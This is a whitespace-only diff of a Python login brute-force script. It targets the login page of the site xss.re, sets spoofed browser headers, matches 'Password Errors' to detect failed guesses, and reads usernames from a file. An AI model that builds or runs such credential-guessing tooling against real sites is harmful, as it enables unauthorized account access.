@@ -10,9 +10,10 @@ headers = {'Host':'xss.re', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:24.0)
 			'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 
 			'DNT': '1', 'Referer': 'http://xss.re/xss/?do=user&act=login', 'Content-Type': 'application/x-www-form-urlencoded' 
 			}
+			
 patt_error = 'Password Errors'
-		
-		
+
+
 def bruteforce(username, password):
 	username = username.strip()
 	password = password.strip()
@@ -31,7 +32,7 @@ def bruteforce(username, password):
 	except Exception as e:
 		print('f4ck error is : {}'.format(e))
 		pass
-		
+
 def main():
 	try:
 		f_username = open('username.txt', 'r+')
